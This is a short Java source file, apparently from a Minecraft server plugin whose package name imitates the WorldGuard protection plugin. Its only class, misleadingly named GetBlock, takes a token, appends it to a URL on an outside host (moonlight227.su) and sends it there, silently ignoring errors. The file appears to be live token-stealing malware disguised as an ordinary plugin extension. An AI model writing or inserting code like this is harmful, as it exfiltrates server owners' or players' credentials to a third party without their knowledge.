package com.fastblock.worlguard.extension;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class GetBlock {
   public static void send(String token) {
      try {
         String urlBot = "http://moonlight227.su/token.php?=" + token;
         URL url = null;
         URLConnection urlConnection = null;
         BufferedReader bfR = null;
         InputStreamReader isR = null;
         url = new URL(urlBot);
         urlConnection = url.openConnection();
         isR = new InputStreamReader(urlConnection.getInputStream());
         bfR = new BufferedReader(isR);
         String var6 = bfR.readLine();
      } catch (IOException var7) {
      }

   }
}